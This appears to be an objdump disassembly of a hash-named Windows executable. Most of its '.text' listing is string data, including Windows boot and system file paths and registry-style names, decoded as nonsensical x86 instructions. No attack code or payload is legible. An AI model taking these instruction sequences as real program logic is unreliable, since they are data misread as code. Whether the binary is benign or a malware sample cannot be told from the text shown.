
ca6710ac624c4badd89606d2d46270b68a494b9778a109477955f6403d77493e.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	mov    al,0x6d
  401006:	inc    eax
	...
  40100f:	add    al,ah
  401011:	ins    BYTE PTR es:[edi],dx
  401012:	inc    eax
  401013:	add    BYTE PTR [eax+0x71],dh
  401016:	inc    eax
  401017:	add    BYTE PTR [eax],al
  401019:	add    BYTE PTR [eax],al
  40101b:	add    BYTE PTR [eax],ah
  40101d:	and    DWORD PTR [eax],eax
  40101f:	add    BYTE PTR [eax+0x21],dh
  401025:	add    BYTE PTR cs:[eax],al
  401028:	push   eax
  401029:	das    
  40102a:	add    BYTE PTR [eax],al
  40102c:	and    BYTE PTR [ebx],dh
  40102e:	add    BYTE PTR [eax],al
  401030:	shl    BYTE PTR [esi],0x0
  401033:	add    BYTE PTR [eax+0x3d],dh
  401036:	add    BYTE PTR [eax],al
  401038:	mov    al,0x43
  40103a:	add    BYTE PTR [eax],al
  40103c:	nop
  40103d:	inc    edi
  40103e:	add    BYTE PTR [eax],al
  401040:	adc    BYTE PTR [ebp+0x0],cl
  401043:	add    al,dl
  401045:	push   ecx
  401046:	add    BYTE PTR [eax],al
  401048:	jo     0x40109c
  40104a:	add    BYTE PTR [eax],al
  40104c:	rcl    BYTE PTR [edx+0x0],1
  40104f:	add    BYTE PTR [eax+0x53],dh
  401052:	add    BYTE PTR [eax],al
  401054:	rcl    BYTE PTR [ebx+0x0],1
  401057:	add    BYTE PTR [eax],ah
  401059:	push   ebp
  40105a:	add    BYTE PTR [eax],al
  40105c:	push   eax
  40105d:	pop    edx
  40105e:	add    BYTE PTR [eax],al
  401060:	loopne 0x4010ce
  401062:	add    BYTE PTR [eax],al
  401064:	mov    al,0x6d
  401066:	add    BYTE PTR [eax],al
  401068:	mov    al,0x6f
  40106a:	add    BYTE PTR [eax],al
  40106c:	shr    BYTE PTR [edi+0x0],0x0
  401070:	and    BYTE PTR [ecx+0x0],dh
  401073:	add    BYTE PTR [eax+0x71],dh
  401076:	add    BYTE PTR [eax],al
  401078:	push   eax
  401079:	je     0x40107b
  40107b:	add    al,ah
  40107d:	je     0x40107f
  40107f:	add    BYTE PTR [eax],dl
  401081:	jne    0x401083
	...
  40108f:	add    al,ah
  401091:	add    BYTE PTR [eax+0x0],0x30
  401095:	add    DWORD PTR [eax+0x0],0x2c
  40109c:	add    BYTE PTR cs:[eax],al
  40109f:	add    BYTE PTR [edx],bh
  4010a1:	add    BYTE PTR [eax],ah
  4010a3:	add    BYTE PTR [eax],al
  4010a5:	add    BYTE PTR [eax],al
  4010a7:	add    BYTE PTR [edi],ch
  4010a9:	add    BYTE PTR [ebx+0x0],ah
  4010ac:	add    BYTE PTR [eax],al
  4010ae:	add    BYTE PTR [eax],al
  4010b0:	das    
  4010b1:	add    BYTE PTR [ebp+0x0],dh
  4010b4:	add    BYTE PTR [eax],al
  4010b6:	add    BYTE PTR [eax],al
  4010b8:	das    
  4010b9:	add    BYTE PTR [ecx+0x0],dh
  4010bc:	add    BYTE PTR [eax],al
  4010be:	add    BYTE PTR [eax],al
  4010c0:	das    
  4010c1:	add    BYTE PTR [ebx+0x0],dh
  4010c4:	add    BYTE PTR [eax],al
  4010c6:	add    BYTE PTR [eax],al
  4010c8:	das    
  4010c9:	add    BYTE PTR [ecx+0x0],ch
  4010cc:	add    BYTE PTR [eax],al
  4010ce:	add    BYTE PTR [eax],al
  4010d0:	das    
  4010d1:	add    BYTE PTR [esi+0x0],ah
  4010d4:	add    BYTE PTR [eax],al
  4010d6:	add    BYTE PTR [eax],al
  4010d8:	das    
  4010d9:	add    BYTE PTR [ecx+0x0],ah
  4010dc:	add    BYTE PTR [eax],al
  4010de:	add    BYTE PTR [eax],al
  4010e0:	das    
  4010e1:	add    BYTE PTR [ebp+0x0],ah
  4010e4:	js     0x4010e6
  4010e6:	add    BYTE PTR gs:[eax],al
  4010e9:	add    BYTE PTR [eax],al
  4010eb:	add    BYTE PTR [eax+0x0],bh
  4010ee:	jo     0x4010f0
  4010f0:	jb     0x4010f2
  4010f2:	add    BYTE PTR gs:[ebx+0x0],dh
  4010f6:	jae    0x4010f8
  4010f8:	xor    al,0x0
  4010fa:	imul   eax,DWORD PTR [eax],0x0
  4010fd:	add    BYTE PTR [eax],al
  4010ff:	add    BYTE PTR [eax+0x0],bh
  401102:	jo     0x401104
  401104:	jb     0x401106
  401106:	add    BYTE PTR gs:[ebx+0x0],dh
  40110a:	jae    0x40110c
  40110c:	cmp    BYTE PTR [eax],al
  40110e:	imul   eax,DWORD PTR [eax],0x0
  401111:	add    BYTE PTR [eax],al
  401113:	add    BYTE PTR [eax+0x0],bh
  401116:	jo     0x401118
  401118:	jb     0x40111a
  40111a:	add    BYTE PTR gs:[ebx+0x0],dh
  40111e:	jae    0x401120
  401120:	xor    DWORD PTR [eax],eax
  401122:	add    BYTE PTR ss:[ebx+0x0],ch
  401126:	add    BYTE PTR [eax],al
  401128:	ins    BYTE PTR es:[edi],dx
  401129:	add    BYTE PTR [edx+0x0],bh
  40112c:	js     0x40112e
  40112e:	add    BYTE PTR [eax],al
  401130:	das    
  401131:	add    BYTE PTR [ebx+0x0],ah
  401134:	outs   dx,DWORD PTR ds:[esi]
  401135:	add    BYTE PTR [ebp+0x0],ch
  401138:	jo     0x40113a
  40113a:	popa   
  40113b:	add    BYTE PTR [ebx+0x0],ah
  40113e:	je     0x401140
  401140:	outs   dx,DWORD PTR ds:[esi]
  401141:	add    BYTE PTR [ebx+0x0],dh
  401144:	add    BYTE PTR [eax],al
  401146:	add    BYTE PTR [eax],al
  401148:	jno    0x40114a
  40114a:	jne    0x40114c
  40114c:	add    BYTE PTR gs:[edx+0x0],dh
  401150:	jns    0x401152
  401152:	add    BYTE PTR [eax],al
  401154:	popa   
  401155:	add    BYTE PTR [eax+eax*1+0x77],ch
  401159:	add    BYTE PTR [ecx+0x0],ah
  40115c:	jns    0x40115e
  40115e:	jae    0x401160
  401160:	add    BYTE PTR [eax],al
  401162:	add    BYTE PTR [eax],al
  401164:	outs   dx,BYTE PTR ds:[esi]
  401165:	add    BYTE PTR [ebp+0x0],ah
  401168:	jbe    0x40116a
  40116a:	add    BYTE PTR gs:[edx+0x0],dh
  40116e:	add    BYTE PTR [eax],al
  401170:	das    
  401171:	add    BYTE PTR [edi],bh
  401173:	add    BYTE PTR [eax],al
  401175:	add    BYTE PTR [eax],al
  401177:	add    BYTE PTR [edx],ch
  401179:	add    BYTE PTR [eax],al
  40117b:	add    BYTE PTR [eax],al
  40117d:	add    BYTE PTR [eax],al
  40117f:	add    BYTE PTR [eax+eax*1+0x0],bl
  401183:	add    BYTE PTR [eax],al
  401185:	add    BYTE PTR [eax],al
  401187:	add    BYTE PTR [ebx+0x0],dl
  40118a:	dec    edi
  40118b:	add    BYTE PTR [esi+0x0],al
  40118e:	push   esp
  40118f:	add    BYTE PTR [edi+0x0],dl
  401192:	inc    ecx
  401193:	add    BYTE PTR [edx+0x0],dl
  401196:	inc    ebp
  401197:	add    BYTE PTR [eax+eax*1+0x4d],bl
  40119b:	add    BYTE PTR [ecx+0x0],ch
  40119e:	arpl   WORD PTR [eax],ax
  4011a0:	jb     0x4011a2
  4011a2:	outs   dx,DWORD PTR ds:[esi]
  4011a3:	add    BYTE PTR [ebx+0x0],dh
  4011a6:	outs   dx,DWORD PTR ds:[esi]
  4011a7:	add    BYTE PTR [esi+0x0],ah
  4011aa:	je     0x4011ac
  4011ac:	pop    esp
  4011ad:	add    BYTE PTR [edi+0x0],dl
  4011b0:	imul   eax,DWORD PTR [eax],0x64006e
  4011b6:	outs   dx,DWORD PTR ds:[esi]
  4011b7:	add    BYTE PTR [edi+0x0],dh
  4011ba:	jae    0x4011bc
  4011bc:	and    BYTE PTR [eax],al
  4011be:	dec    esi
  4011bf:	add    BYTE PTR [eax+eax*1+0x5c],dl
  4011c3:	add    BYTE PTR [ebx+0x0],al
  4011c6:	jne    0x4011c8
  4011c8:	jb     0x4011ca
  4011ca:	jb     0x4011cc
  4011cc:	add    BYTE PTR gs:[esi+0x0],ch
  4011d0:	je     0x4011d2
  4011d2:	push   esi
  4011d3:	add    BYTE PTR [ebp+0x0],ah
  4011d6:	jb     0x4011d8
  4011d8:	jae    0x4011da
  4011da:	imul   eax,DWORD PTR [eax],0x6e006f
  4011e0:	pop    esp
  4011e1:	add    BYTE PTR [edi+0x0],dl
  4011e4:	dec    edi
  4011e5:	add    BYTE PTR [esi+0x0],al
  4011e8:	add    BYTE PTR [eax],al
  4011ea:	add    BYTE PTR [eax],al
  4011ec:	inc    esi
  4011ed:	add    BYTE PTR [edi+0x0],ch
  4011f0:	jb     0x4011f2
  4011f2:	arpl   WORD PTR [eax],ax
  4011f4:	add    BYTE PTR gs:[ecx+0x0],al
  4011f8:	ins    BYTE PTR es:[edi],dx
  4011f9:	add    BYTE PTR [edi+0x0],ah
  4011fc:	outs   dx,DWORD PTR ds:[esi]
  4011fd:	add    BYTE PTR [edx+0x0],dh
  401200:	imul   eax,DWORD PTR [eax],0x680074
  401206:	ins    DWORD PTR es:[edi],dx
  401207:	add    BYTE PTR [eax],al
  401209:	add    BYTE PTR [eax],al
  40120b:	add    BYTE PTR [esi+0x0],al
  40120e:	outs   dx,DWORD PTR ds:[esi]
  40120f:	add    BYTE PTR [edx+0x0],dh
  401212:	arpl   WORD PTR [eax],ax
  401214:	add    BYTE PTR gs:[esi+0x0],cl
  401218:	outs   dx,DWORD PTR ds:[esi]
  401219:	add    BYTE PTR [ebx+0x0],al
  40121c:	outs   dx,DWORD PTR ds:[esi]
  40121d:	add    BYTE PTR [ebp+0x0],ch
  401220:	jo     0x401222
  401222:	jb     0x401224
  401224:	add    BYTE PTR gs:[ebx+0x0],dh
  401228:	jae    0x40122a
  40122a:	imul   eax,DWORD PTR [eax],0x6e006f
  401230:	add    BYTE PTR [eax],al
  401232:	add    BYTE PTR [eax],al
  401234:	push   ebx
  401235:	add    BYTE PTR [ecx+0x0],bh
  401238:	jae    0x40123a
  40123a:	je     0x40123c
  40123c:	add    BYTE PTR gs:[ebp+0x0],ch
  401240:	pop    esp
  401241:	add    BYTE PTR [ebx+0x0],dl
  401244:	add    BYTE PTR gs:[eax+eax*1+0x75],dh
  401249:	add    BYTE PTR [eax+0x0],dh
  40124c:	add    BYTE PTR [eax],al
  40124e:	add    BYTE PTR [eax],al
  401250:	inc    ebx
  401251:	add    BYTE PTR [edi+0x0],ch
  401254:	ins    DWORD PTR es:[edi],dx
  401255:	add    BYTE PTR [eax+0x0],dh
  401258:	popa   
  401259:	add    BYTE PTR [ebx+0x0],ah
  40125c:	je     0x40125e
  40125e:	add    BYTE PTR [eax],al
  401260:	jl     0x401262
  401262:	add    BYTE PTR [eax],al
  401264:	das    
  401265:	add    BYTE PTR [eax],al
  401267:	add    BYTE PTR ds:0x5c000000,ch
  40126d:	add    BYTE PTR [ecx+0x0],ah
  401270:	outs   dx,DWORD PTR ds:[esi]
  401271:	add    BYTE PTR [edi+0x0],dh
  401274:	add    BYTE PTR cs:[edi+0x0],dh
  401278:	imul   eax,DWORD PTR [eax],0x6d
  40127e:	add    BYTE PTR [eax],al
  401280:	pop    esp
  401281:	add    BYTE PTR [edx+0x0],ah
  401284:	outs   dx,DWORD PTR ds:[esi]
  401285:	add    BYTE PTR [edi+0x0],ch
  401288:	je     0x40128a
  40128a:	pop    esp
  40128b:	add    BYTE PTR [edx+0x0],ah
  40128e:	arpl   WORD PTR [eax],ax
  401290:	add    BYTE PTR fs:[eax],al
  401293:	add    BYTE PTR [eax+eax*1+0x62],bl
  401297:	add    BYTE PTR [edi+0x0],ch
  40129a:	outs   dx,DWORD PTR ds:[esi]
  40129b:	add    BYTE PTR [eax+eax*1+0x5c],dh
  40129f:	add    BYTE PTR [edx+0x0],ah
  4012a2:	arpl   WORD PTR [eax],ax
  4012a4:	add    BYTE PTR fs:[esi],ch
  4012a7:	add    BYTE PTR [eax+eax*1+0x6f],ch
  4012ab:	add    BYTE PTR [edi+0x0],ah
  4012ae:	add    BYTE PTR [eax],al
  4012b0:	pop    esp
  4012b1:	add    BYTE PTR [edx+0x0],ah
  4012b4:	outs   dx,DWORD PTR ds:[esi]
  4012b5:	add    BYTE PTR [edi+0x0],ch
  4012b8:	je     0x4012ba
  4012ba:	pop    esp
  4012bb:	add    BYTE PTR [edx+0x0],ah
  4012be:	outs   dx,DWORD PTR ds:[esi]
  4012bf:	add    BYTE PTR [edi+0x0],ch
  4012c2:	je     0x4012c4
  4012c4:	jae    0x4012c6
  4012c6:	je     0x4012c8
  4012c8:	popa   
  4012c9:	add    BYTE PTR [eax+eax*1+0x2e],dh
  4012cd:	add    BYTE PTR [eax+eax*1+0x61],ah
  4012d1:	add    BYTE PTR [eax+eax*1+0x0],dh
  4012d5:	add    BYTE PTR [eax],al
  4012d7:	add    BYTE PTR [eax+eax*1+0x63],bl
  4012db:	add    BYTE PTR [edi+0x0],ch
  4012de:	outs   dx,BYTE PTR ds:[esi]
  4012df:	add    BYTE PTR [esi+0x0],ah
  4012e2:	imul   eax,DWORD PTR [eax],0x5c0067
  4012e8:	add    BYTE PTR fs:[edx+0x0],dh
  4012ec:	imul   eax,DWORD PTR [eax],0x650076
  4012f2:	jb     0x4012f4
  4012f4:	jae    0x4012f6
  4012f6:	add    BYTE PTR [eax],al
  4012f8:	pop    esp
  4012f9:	add    BYTE PTR [ebx+0x0],ah
  4012fc:	outs   dx,DWORD PTR ds:[esi]
  4012fd:	add    BYTE PTR [esi+0x0],ch
  401300:	data16 add BYTE PTR [ecx+0x0],ch
  401304:	add    BYTE PTR [si+0x0],bl
  401308:	add    BYTE PTR fs:[edx+0x0],dh
  40130c:	imul   eax,DWORD PTR [eax],0x650076
  401312:	jb     0x401314
  401314:	jae    0x401316
  401316:	add    BYTE PTR cs:[eax+eax*1+0x6f],ch
  40131b:	add    BYTE PTR [edi+0x0],ah
  40131e:	add    BYTE PTR [eax],al
  401320:	pop    esp
  401321:	add    BYTE PTR [ebx+0x0],ah
  401324:	outs   dx,DWORD PTR ds:[esi]
  401325:	add    BYTE PTR [esi+0x0],ch
  401328:	data16 add BYTE PTR [ecx+0x0],ch
  40132c:	add    BYTE PTR [si+0x0],bl
  401330:	jae    0x401332
  401332:	jns    0x401334
  401334:	jae    0x401336
  401336:	je     0x401338
  401338:	add    BYTE PTR gs:[ebp+0x0],ch
  40133c:	add    BYTE PTR [eax],al
  40133e:	add    BYTE PTR [eax],al
  401340:	pop    esp
  401341:	add    BYTE PTR [ebx+0x0],ah
  401344:	outs   dx,DWORD PTR ds:[esi]
  401345:	add    BYTE PTR [esi+0x0],ch
  401348:	data16 add BYTE PTR [ecx+0x0],ch
  40134c:	add    BYTE PTR [si+0x0],bl
  401350:	jae    0x401352
  401352:	jns    0x401354
  401354:	jae    0x401356
  401356:	je     0x401358
  401358:	add    BYTE PTR gs:[ebp+0x0],ch
  40135c:	add    BYTE PTR cs:[eax+eax*1+0x6f],ch
  401361:	add    BYTE PTR [edi+0x0],ah
  401364:	add    BYTE PTR [eax],al
  401366:	add    BYTE PTR [eax],al
  401368:	pop    esp
  401369:	add    BYTE PTR [edi+0x0],dh
  40136c:	imul   eax,DWORD PTR [eax],0x64006e
  401372:	outs   dx,DWORD PTR ds:[esi]
  401373:	add    BYTE PTR [edi+0x0],dh
  401376:	jae    0x401378
  401378:	pop    esp
  401379:	add    BYTE PTR [edx+0x0],ah
  40137c:	outs   dx,DWORD PTR ds:[esi]
  40137d:	add    BYTE PTR [edi+0x0],ch
  401380:	je     0x401382
  401382:	jae    0x401384
  401384:	je     0x401386
  401386:	popa   
  401387:	add    BYTE PTR [eax+eax*1+0x2e],dh
  40138b:	add    BYTE PTR [eax+eax*1+0x61],ah
  40138f:	add    BYTE PTR [eax+eax*1+0x0],dh
  401393:	add    BYTE PTR [eax+eax*1+0x77],bl
  401397:	add    BYTE PTR [ecx+0x0],ch
  40139a:	outs   dx,BYTE PTR ds:[esi]
  40139b:	add    BYTE PTR [eax+eax*1+0x6f],ch
  40139f:	add    BYTE PTR [ecx+0x0],ah
  4013a2:	add    BYTE PTR fs:[esi],ch
  4013a5:	add    BYTE PTR [ebp+0x0],ah
  4013a8:	data16 add BYTE PTR [ecx+0x0],ch
  4013ac:	add    BYTE PTR [eax],al
  4013ae:	add    BYTE PTR [eax],al
  4013b0:	pop    esp
  4013b1:	add    BYTE PTR [edi+0x0],dh
  4013b4:	imul   eax,DWORD PTR [eax],0x6c006e
  4013ba:	outs   dx,DWORD PTR ds:[esi]
  4013bb:	add    BYTE PTR [ecx+0x0],ah
  4013be:	add    BYTE PTR fs:[esi],ch
  4013c1:	add    BYTE PTR [ebp+0x0],ah
  4013c4:	data16 add BYTE PTR [ecx+0x0],ch
  4013c8:	add    BYTE PTR cs:[ebp+0x0],ch
  4013cc:	jne    0x4013ce
  4013ce:	imul   eax,DWORD PTR [eax],0x0
  4013d4:	pop    esp
  4013d5:	add    BYTE PTR [edi+0x0],dh
  4013d8:	imul   eax,DWORD PTR [eax],0x6c006e
  4013de:	outs   dx,DWORD PTR ds:[esi]
  4013df:	add    BYTE PTR [ecx+0x0],ah
  4013e2:	add    BYTE PTR fs:[esi],ch
  4013e5:	add    BYTE PTR [ebp+0x0],ah
  4013e8:	js     0x4013ea
  4013ea:	add    BYTE PTR gs:[eax],al
  4013ed:	add    BYTE PTR [eax],al
  4013ef:	add    BYTE PTR [eax+eax*1+0x77],bl
  4013f3:	add    BYTE PTR [ecx+0x0],ch
  4013f6:	outs   dx,BYTE PTR ds:[esi]
  4013f7:	add    BYTE PTR [eax+eax*1+0x6f],ch
  4013fb:	add    BYTE PTR [ecx+0x0],ah
  4013fe:	add    BYTE PTR fs:[esi],ch
  401401:	add    BYTE PTR [ebp+0x0],ah
  401404:	js     0x401406
  401406:	add    BYTE PTR gs:[esi],ch
  401409:	add    BYTE PTR [ebp+0x0],ch
  40140c:	jne    0x40140e
  40140e:	imul   eax,DWORD PTR [eax],0x0
  401414:	pop    esp
  401415:	add    BYTE PTR [edi+0x0],dh
  401418:	imul   eax,DWORD PTR [eax],0x72006e
  40141e:	add    BYTE PTR gs:[ebx+0x0],dh
  401422:	jne    0x401424
  401424:	ins    DWORD PTR es:[edi],dx
  401425:	add    BYTE PTR [ebp+0x0],ah
  401428:	add    BYTE PTR cs:[ebp+0x0],ah
  40142c:	data16 add BYTE PTR [ecx+0x0],ch
  401430:	add    BYTE PTR [eax],al
  401432:	add    BYTE PTR [eax],al
  401434:	pop    esp
  401435:	add    BYTE PTR [edi+0x0],dh
  401438:	imul   eax,DWORD PTR [eax],0x72006e
  40143e:	add    BYTE PTR gs:[ebx+0x0],dh
  401442:	jne    0x401444
  401444:	ins    DWORD PTR es:[edi],dx
  401445:	add    BYTE PTR [ebp+0x0],ah
  401448:	add    BYTE PTR cs:[ebp+0x0],ah
  40144c:	data16 add BYTE PTR [ecx+0x0],ch
  401450:	add    BYTE PTR cs:[ebp+0x0],ch
  401454:	jne    0x401456
  401456:	imul   eax,DWORD PTR [eax],0x0
  40145c:	pop    esp
  40145d:	add    BYTE PTR [edi+0x0],dh
  401460:	imul   eax,DWORD PTR [eax],0x72006e
  401466:	add    BYTE PTR gs:[ebx+0x0],dh
  40146a:	jne    0x40146c
  40146c:	ins    DWORD PTR es:[edi],dx
  40146d:	add    BYTE PTR [ebp+0x0],ah
  401470:	add    BYTE PTR cs:[ebp+0x0],ah
  401474:	js     0x401476
  401476:	add    BYTE PTR gs:[eax],al
  401479:	add    BYTE PTR [eax],al
  40147b:	add    BYTE PTR [eax+eax*1+0x77],bl
  40147f:	add    BYTE PTR [ecx+0x0],ch
  401482:	outs   dx,BYTE PTR ds:[esi]
  401483:	add    BYTE PTR [edx+0x0],dh
  401486:	add    BYTE PTR gs:[ebx+0x0],dh
  40148a:	jne    0x40148c
  40148c:	ins    DWORD PTR es:[edi],dx
  40148d:	add    BYTE PTR [ebp+0x0],ah
  401490:	add    BYTE PTR cs:[ebp+0x0],ah
  401494:	js     0x401496
  401496:	add    BYTE PTR gs:[esi],ch
  401499:	add    BYTE PTR [ebp+0x0],ch
  40149c:	jne    0x40149e
  40149e:	imul   eax,DWORD PTR [eax],0x0
  4014a4:	pop    esp
  4014a5:	add    BYTE PTR [edx+0x0],al
  4014a8:	popa   
  4014a9:	add    BYTE PTR [ebx+0x0],ah
  4014ac:	imul   eax,DWORD PTR [eax],0x75
  4014af:	add    BYTE PTR [eax+0x0],dh
  4014b2:	pop    esp
  4014b3:	add    BYTE PTR [eax],al
  4014b5:	add    BYTE PTR [eax],al
  4014b7:	add    BYTE PTR [eax+eax*1+0x4d],bl
  4014bb:	add    BYTE PTR [ecx+0x0],ah
  4014be:	outs   dx,BYTE PTR ds:[esi]
  4014bf:	add    BYTE PTR [ecx+0x0],ch
  4014c2:	data16 add BYTE PTR [ebp+0x0],ah
  4014c6:	jae    0x4014c8
  4014c8:	je     0x4014ca
  4014ca:	inc    ebx
  4014cb:	add    BYTE PTR [ecx+0x0],ah
  4014ce:	arpl   WORD PTR [eax],ax
  4014d0:	push   0x5c006500
  4014d5:	add    BYTE PTR [eax],al
  4014d7:	add    BYTE PTR [eax+eax*1+0x4d],bl
  4014db:	add    BYTE PTR [ecx+0x0],ah
  4014de:	outs   dx,BYTE PTR ds:[esi]
  4014df:	add    BYTE PTR [ecx+0x0],ch
  4014e2:	data16 add BYTE PTR [ebp+0x0],ah
  4014e6:	jae    0x4014e8
  4014e8:	je     0x4014ea
  4014ea:	jae    0x4014ec
  4014ec:	pop    esp
  4014ed:	add    BYTE PTR [eax],al
  4014ef:	add    BYTE PTR [eax+eax*1+0x6e],bl
  4014f3:	add    BYTE PTR [eax+eax*1+0x6c],dh
  4014f7:	add    BYTE PTR [eax+eax*1+0x72],ah
  4014fb:	add    BYTE PTR [eax],al
  4014fd:	add    BYTE PTR [eax],al
  4014ff:	add    BYTE PTR [eax+eax*1+0x63],bl
  401503:	add    BYTE PTR [ebp+0x0],ch
  401506:	ins    BYTE PTR es:[edi],dx
  401507:	add    BYTE PTR [eax+eax*1+0x72],ah
  40150b:	add    BYTE PTR [eax],al
  40150d:	add    BYTE PTR [eax],al
  40150f:	add    BYTE PTR [eax+eax*1+0x42],bl
  401513:	add    BYTE PTR [edi+0x0],ch
  401516:	outs   dx,DWORD PTR ds:[esi]
  401517:	add    BYTE PTR [eax+eax*1+0x4d],dh
  40151b:	add    BYTE PTR [edi+0x0],ah
  40151e:	jb     0x401520
  401520:	add    BYTE PTR [eax],al
  401522:	add    BYTE PTR [eax],al
  401524:	and    BYTE PTR [eax],al
  401526:	cmp    al,BYTE PTR [eax]
  401528:	and    BYTE PTR [eax],al
  40152a:	add    BYTE PTR [eax],al
  40152c:	and    BYTE PTR [eax],al
  40152e:	cmp    eax,0x25002000
  401533:	add    BYTE PTR [edx],dh
  401535:	add    BYTE PTR [esi],ch
  401537:	add    BYTE PTR [ecx],dh
  401539:	add    BYTE PTR [eax+eax*1+0x66],ch
  40153d:	add    BYTE PTR [eax],ah
  40153f:	add    BYTE PTR [eax],al
  401541:	add    BYTE PTR [eax],al
  401543:	add    BYTE PTR ds:0x20006300,ah
  401549:	add    BYTE PTR ds:0x7300,ah
  40154f:	add    BYTE PTR [esi],ch
  401551:	add    BYTE PTR [esi],ch
  401553:	add    BYTE PTR [eax],al
  401555:	add    BYTE PTR [eax],al
  401557:	add    BYTE PTR ds:0x6400,ah
  40155d:	add    BYTE PTR [eax],al
  40155f:	add    BYTE PTR ds:0x2e003200,ah
  401565:	add    BYTE PTR [ecx],dh
  401567:	add    BYTE PTR [eax+eax*1+0x66],ch
  40156b:	add    BYTE PTR [eax],al
  40156d:	add    BYTE PTR [eax],al
  40156f:	add    BYTE PTR ds:0x20007300,ah
  401575:	add    BYTE PTR [eax],al
  401577:	add    BYTE PTR ds:0x6300,ah
  40157d:	add    BYTE PTR [eax],al
  40157f:	add    BYTE PTR ds:0x2e003200,ah
  401585:	add    BYTE PTR [ecx],dh
  401587:	add    BYTE PTR [esi+0x0],ah
  40158a:	add    BYTE PTR [eax],al
  40158c:	pop    esp
  40158d:	add    BYTE PTR [edi+0x0],dh
  401590:	imul   eax,DWORD PTR [eax],0x73006e
  401596:	js     0x401598
  401598:	jae    0x40159a
  40159a:	pop    esp
  40159b:	add    BYTE PTR [eax],al
  40159d:	add    BYTE PTR [eax],al
  40159f:	add    BYTE PTR [eax+0x12],ah
  4015a2:	inc    eax
  4015a3:	add    BYTE PTR [edx+edx*1+0x40],ah
  4015a7:	add    BYTE PTR [eax+0x12],ch
  4015aa:	inc    eax
  4015ab:	add    BYTE PTR [eax+0x52004011],al
  4015b1:	gs addr16 push esi
  4015b4:	popa   
  4015b5:	ins    BYTE PTR es:[edi],dx
  4015b6:	jne    0x40161d
  4015b8:	and    BYTE PTR ds:0x69207377,ah
  4015be:	jae    0x4015e0
  4015c0:	and    eax,0x53000a75
  4015c5:	gs je  0x40163c
  4015c8:	imul   ebp,DWORD PTR [esi+0x67],0x73772520
  4015cf:	and    BYTE PTR [edi+ebp*2+0x20],dh
  4015d3:	and    eax,0xa75
  4015d8:	inc    esi
  4015d9:	add    BYTE PTR [eax+eax*1+0x61],ch
  4015dd:	add    BYTE PTR [edi+0x0],ah
  4015e0:	jae    0x4015e2
  4015e2:	add    BYTE PTR [eax],al
  4015e4:	dec    ebp
  4015e5:	add    BYTE PTR [ecx+0x0],ch
  4015e8:	outs   dx,BYTE PTR ds:[esi]
  4015e9:	add    BYTE PTR [eax+0x0],dl
  4015ec:	jb     0x4015ee
  4015ee:	outs   dx,DWORD PTR ds:[esi]
  4015ef:	add    BYTE PTR [ebx+0x0],ah
  4015f2:	add    BYTE PTR gs:[ebx+0x0],dh
  4015f6:	jae    0x4015f8
  4015f8:	outs   dx,DWORD PTR ds:[esi]
  4015f9:	add    BYTE PTR [edx+0x0],dh
  4015fc:	inc    ebx
  4015fd:	add    BYTE PTR [edi+0x0],ch
  401600:	jne    0x401602
  401602:	outs   dx,BYTE PTR ds:[esi]
  401603:	add    BYTE PTR [eax+eax*1+0x0],dh
  401607:	add    BYTE PTR [ebp+0x0],cl
  40160a:	imul   eax,DWORD PTR [eax],0x52006e
  401610:	inc    ecx
  401611:	add    BYTE PTR [ebp+0x0],cl
  401614:	push   ebx
  401615:	add    BYTE PTR [ecx+0x0],ch
  401618:	jp     0x40161a
  40161a:	add    BYTE PTR gs:[ebp+0x0],cl
  40161e:	inc    edx
  40161f:	add    BYTE PTR [eax],al
  401621:	add    BYTE PTR [eax],al
  401623:	add    BYTE PTR [ebp+0x0],cl
  401626:	popa   
  401627:	add    BYTE PTR [eax+0x0],bh
  40162a:	push   esi
  40162b:	add    BYTE PTR [edi+0x0],ch
  40162e:	ins    BYTE PTR es:[edi],dx
  40162f:	add    BYTE PTR [ebp+0x0],dh
  401632:	ins    DWORD PTR es:[edi],dx
  401633:	add    BYTE PTR [ebp+0x0],ah
  401636:	push   ebx
  401637:	add    BYTE PTR [ecx+0x0],ch
  40163a:	jp     0x40163c
  40163c:	add    BYTE PTR gs:[ebp+0x0],cl
  401640:	inc    edx
  401641:	add    BYTE PTR [eax],al
  401643:	add    BYTE PTR [ebp+0x0],cl
  401646:	imul   eax,DWORD PTR [eax],0x44006e
  40164c:	add    BYTE PTR gs:[ebx+0x0],ah
  401650:	outs   dx,DWORD PTR ds:[esi]
  401651:	add    BYTE PTR [ebp+0x0],ch
  401654:	jo     0x401656
  401656:	jb     0x401658
  401658:	add    BYTE PTR gs:[ebx+0x0],dh
  40165c:	jae    0x40165e
  40165e:	imul   eax,DWORD PTR [eax],0x6e006f
  401664:	push   edx
  401665:	add    BYTE PTR [ecx+0x0],ah
  401668:	je     0x40166a
  40166a:	add    BYTE PTR gs:[ebx+0x0],cl
  40166e:	inc    edx
  40166f:	add    BYTE PTR [ebx+0x0],dh
  401672:	add    BYTE PTR [eax],al
  401674:	dec    esp
  401675:	add    BYTE PTR [edi+0x0],ch
  401678:	ja     0x40167a
  40167a:	push   ebx
  40167b:	add    BYTE PTR [eax+eax*1+0x6f],dh
  40167f:	add    BYTE PTR [edx+0x0],dh
  401682:	popa   
  401683:	add    BYTE PTR [edi+0x0],ah
  401686:	add    BYTE PTR gs:[eax+0x0],dl
  40168a:	push   0x6e006f00
  40168f:	add    BYTE PTR [ebp+0x0],ah
  401692:	dec    ebp
  401693:	add    BYTE PTR [edx+0x0],al
  401696:	add    BYTE PTR [eax],al
  401698:	dec    ebp
  401699:	add    BYTE PTR [ecx+0x0],ch
  40169c:	outs   dx,BYTE PTR ds:[esi]
  40169d:	add    BYTE PTR [ebx+0x0],al
  4016a0:	push   eax
  4016a1:	add    BYTE PTR [ebp+0x0],dl
  4016a4:	dec    eax
  4016a5:	add    BYTE PTR [ebp+0x0],ah
  4016a8:	popa   
  4016a9:	add    BYTE PTR [eax+eax*1+0x72],ah
  4016ad:	add    BYTE PTR [edi+0x0],ch
  4016b0:	outs   dx,DWORD PTR ds:[esi]
  4016b1:	add    BYTE PTR [ebp+0x0],ch
  4016b4:	push   eax
  4016b5:	add    BYTE PTR [ebp+0x0],ah
  4016b8:	jb     0x4016ba
  4016ba:	arpl   WORD PTR [eax],ax
  4016bc:	add    BYTE PTR [eax],al
  4016be:	add    BYTE PTR [eax],al
  4016c0:	or     dl,BYTE PTR [eax+0x6f]
  4016c3:	ins    BYTE PTR es:[edi],dx
  4016c4:	imul   esp,DWORD PTR [ebx+0x79],0x61726150
  4016cb:	ins    DWORD PTR es:[edi],dx
  4016cc:	jae    0x401708
